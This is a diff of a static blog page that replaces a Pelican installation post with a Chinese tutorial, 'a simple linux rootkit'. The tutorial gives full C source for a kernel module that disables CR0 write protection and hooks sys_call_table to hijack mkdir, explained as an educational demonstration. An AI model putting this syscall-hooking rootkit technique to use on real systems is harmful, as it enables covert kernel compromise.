@@ -6,8 +6,8 @@
         <meta name="author" content="张文" />
         <meta name="copyright" content="张文" />
 
-<meta name="keywords" content="Pelican, Pelican, " />
-        <title>Pelican安装过程  · 观心苑
+<meta name="keywords" content="信息安全, Linux, rootkit, 编程语言, " />
+        <title>一个简单的linux rootkit  · 观心苑
 </title>
         <link href="http://www.vmetu.com/blog/../external/css/slim-081711.css" rel="stylesheet" type="text/css">
         <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.min.css" rel="stylesheet">
@@ -51,56 +51,106 @@
 <article>
 <div class="row-fluid">
     <header class="page_header span10 offset2">
-    <h1><a href="http://www.vmetu.com/blog/pelicanan-zhuang-guo-cheng.html"> Pelican安装过程  </a></h1>
+    <h1><a href="http://www.vmetu.com/blog/yi-ge-jian-dan-de-linux-rootkit.html"> 一个简单的linux rootkit  </a></h1>
     </header>
 </div>
 
 <div class="row-fluid">
         <div class="span8 offset2 article-content">
 
-            <p>今天安装了Pelican，下面来说下过程和遇到的问题</p>
-<ul>
-<li>
-<p>安装Python，因为在Mac下，省掉这一步</p>
-</li>
-<li>
-<p>安装pip(<a href="https://pypi.python.org/packages/source/p/pip/pip-7.1.2.tar.gz#md5=3823d2343d9f3aaab21cf9c917710196">下载地址</a>), 解压后运行： <code>python setup.py install</code> 安装</p>
-</li>
-<li>
-<p>安装pelican， 运行 <code>pip install pelican</code></p>
-</li>
-<li>
-<p>安装markdown， 运行 <code>pip install markdown</code></p>
-</li>
-<li>
-<p>启动pelican创建工程，pelican－quickstart, 此时有可能出现如下错误：</p>
-<div class="highlight"><pre><span></span><span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>  
-<span class="n">File</span> <span class="s2">&quot;/usr/local/bin/pelican-quickstart&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">7</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>  
-    <span class="kn">from</span> <span class="nn">pelican.tools.pelican_quickstart</span> <span class="kn">import</span> <span class="n">main</span>  
-<span class="n">File</span> <span class="s2">&quot;/Library/Python/2.7/site-packages/pelican/__init__.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">20</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>  
-    <span class="kn">from</span> <span class="nn">pelican.generators</span> <span class="kn">import</span> <span class="p">(</span><span class="n">ArticlesGenerator</span><span class="p">,</span> <span class="n">PagesGenerator</span><span class="p">,</span>  
-<span class="n">File</span> <span class="s2">&quot;/Library/Python/2.7/site-packages/pelican/generators.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">22</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>  
-    <span class="kn">from</span> <span class="nn">pelican.readers</span> <span class="kn">import</span> <span class="n">Readers</span>  
-<span class="n">File</span> <span class="s2">&quot;/Library/Python/2.7/site-packages/pelican/readers.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">24</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>  
-    <span class="kn">from</span> <span class="nn">six.moves.html_parser</span> <span class="kn">import</span> <span class="n">HTMLParser</span>  
-<span class="ne">ImportError</span><span class="p">:</span> <span class="n">No</span> <span class="n">module</span> <span class="n">named</span> <span class="n">html_parser</span>
+            <h1 id="linux-rootkit">一个简单的linux rootkit<a class="headerlink" href="#linux-rootkit" title="Permanent link">&para;</a></h1>
+<p>@(编程语言)[信息安全, Linux, rootkit]</p>
+<p>下面提供一个相对完整的rootkit，在Fedora 12上编译运行成功。</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;asm/unistd.h&gt;</span><span class="cp"></span>
+
+<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">&quot;GPL&quot;</span><span class="p">);</span>
+
+<span class="c1">// addr of sys_call_talbe = 0xc077e3a8，这个值是在/boot目录下，System.map或是以System.map打头的文件中找到的。</span>
+<span class="kt">void</span> <span class="o">**</span> <span class="n">sys_call_table</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="mh">0xc077e3a8</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">orig_mkdir</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">);</span> <span class="c1">//定义一个函数指正，用于保存挟制以前的初始值</span>
+
+<span class="kt">int</span> <span class="nf">hack_mkdir</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">path</span><span class="p">)</span> <span class="c1">//定义一个替换函数，它将用来替换某个系统调用</span>
+<span class="p">{</span>
+        <span class="n">printk</span><span class="p">(</span><span class="s">&quot;&lt;0&gt; this is in hack_mkdir</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </pre></div>
 
 
-<p>这时只需要更改一下源文件即可：<code>vim /Library/Python/2.7/site-packages/pelican/readers.py</code>。<br />
-将24行的：<br />
-<code>from six.moves.html_parser import HTMLParser</code><br />
- 换成：<br />
-<code>from HTMLParser import HTMLParser</code><br />
-即可</p>
-</li>
-</ul>
+<p>下面两个函数比较重要，因为在较新的内核中，sys_call_table的内存是只读的，详见entry_32.S:</p>
+<div class="highlight"><pre><span></span><span class="na">.section</span> <span class="no">.rodata</span><span class="p">,</span><span class="s">&quot;a&quot;</span>
+<span class="c">#include &quot;syscall_table_32.S&quot;</span>
+</pre></div>
+
+
+<p>但我们可以通过该cr0寄存器的第16位来取消写保护，cr0寄存器如下：</p>
+<p><img alt="Alt text" src="./register.png" /></p>
+<p>第16位WP位，它控制是否允许处理器向标志为只读属性的内存页写入数据，如果WP=0, 禁用写保护功能。</p>
+<div class="highlight"><pre><span></span>unsigned int clear_cr0(void) // 将WP清0，并返回清0前的值
+{
+        unsigned int cr0 = 0;
+        unsigned int ret;
+        asm volatile(&quot;movl %%cr0, %%eax&quot;
+                :&quot;=a&quot;(cr0)
+                );
+        ret = cr0;
+        cr0 &amp;= 0xfffeffff;
+        asm volatile(&quot;movl %%eax, %%cr0&quot;
+                :
+                :&quot;a&quot;(cr0)
+                );
+                return ret;
+}
+
+void setback_cr0(unsigned int val) // 将cr0设为val
+{
+        asm volatile(&quot;movl %%eax, %%cr0&quot;
+                :
+                :&quot;a&quot;(val)
+                );
+}
+
+static int __init begin(void)
+{
+        unsigned int cr0;
+        orig_mkdir = sys_call_table[__NR_mkdir]; //保存mkdir原来的的地址
+        printk(&quot;&lt;0&gt; sys_call_table[__NR_mkdir] = %x\n&quot;,  (unsigned int)sys_call_table[__NR_mkdir]);
+
+
+        cr0 = clear_cr0();
+        sys_call_table[__NR_mkdir] = hack_mkdir; //挟持
+        setback_cr0(cr0);
+
+        printk(&quot;&lt;0&gt; sys_call_table[__NR_mkdir] = %x\n&quot;, (unsigned int)sys_call_table[__NR_mkdir]);
+
+
+        return 0;
+}
+
+static void __exit end(void)
+{
+        int cr0;
+        cr0 = clear_cr0();
+        sys_call_table[__NR_mkdir] = orig_mkdir; //恢复mkdir系统调用
+        setback_cr0(cr0);  
+}
+
+module_init(begin);
+module_exit(end);
+</pre></div>
+
+
+<p>运行效果：</p>
+<p>加载模块后，mkdir命令失效。</p>
 <section>
 <div class="accordion" id="accordion2">
     <div class="accordion-group">
         <div class="accordion-heading">
             <a class="accordion-toggle disqus-comment-count" data-toggle="collapse" data-parent="#accordion2"
-                href="http://www.vmetu.com/blog/pelicanan-zhuang-guo-cheng.html#disqus_thread">
+                href="http://www.vmetu.com/blog/yi-ge-jian-dan-de-linux-rootkit.html#disqus_thread">
                 Comments
             </a>
         </div>
@@ -110,8 +160,8 @@
 <div id="disqus_thread"></div>
 <script type="text/javascript">
     var disqus_shortname = 'vmetu';
-        var disqus_identifier = 'http://www.vmetu.com/blog/pelicanan-zhuang-guo-cheng.html';
-    var disqus_url = 'http://www.vmetu.com/blog/pelicanan-zhuang-guo-cheng.html';
+        var disqus_identifier = 'http://www.vmetu.com/blog/yi-ge-jian-dan-de-linux-rootkit.html';
+    var disqus_url = 'http://www.vmetu.com/blog/yi-ge-jian-dan-de-linux-rootkit.html';
 
     (function() {
          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
@@ -131,9 +181,9 @@
             <nav>
             <ul class="articles_timeline">
  
-                <li class="previous_article">« <a href="http://www.vmetu.com/blog/yi-ge-neng-chu-li-jsonde-fieldstorage.html" title="Previous: 一个能处理json的FieldStorage">一个能处理json的FieldStorage</a></li>
+                <li class="previous_article">« <a href="http://www.vmetu.com/blog/meng-die.html" title="Previous: 梦蝶">梦蝶</a></li>
  
-                <li class="next_article"><a href="http://www.vmetu.com/blog/unity2dzheng-dong-hua-shi-xian-de-liang-chong-fang-shi.html" title="Next: Unity2D帧动画实现的两种方式">Unity2D帧动画实现的两种方式</a> »</li>
+                <li class="next_article"><a href="http://www.vmetu.com/blog/linuxxia-wei-zhuang-icmpgong-ji-de-shi-xian.html" title="Next: linux下伪装ICMP攻击的实现">linux下伪装ICMP攻击的实现</a> »</li>
             </ul>
             </nav>
             </aside>
@@ -142,12 +192,18 @@
         <div class="span2" style="float:right;font-size:0.9em;">
  
             <h4>Published</h4>
-            <time pubdate="pubdate" datetime="2015-09-16T00:00:00+08:00">九月 16, 2015</time>
+            <time pubdate="pubdate" datetime="2010-04-24T00:00:00+08:00">四月 24, 2010</time>
             <h4>Category</h4>
-            <a class="category-link" href="/categories.html#Pelican-ref">Pelican</a> 
+            <a class="category-link" href="/categories.html#编程语言-ref">编程语言</a> 
             <h4>Tags</h4>
             <ul class="list-of-tags tags-in-article"> 
-                <li><a href="/tags.html#Pelican-ref">Pelican
+                <li><a href="/tags.html#Linux-ref">Linux
+                    <span>1</span>
+</a></li>
+                <li><a href="/tags.html#rootkit-ref">rootkit
+                    <span>1</span>
+</a></li>
+                <li><a href="/tags.html#信息安全-ref">信息安全
                     <span>1</span>
 </a></li>
             </ul>
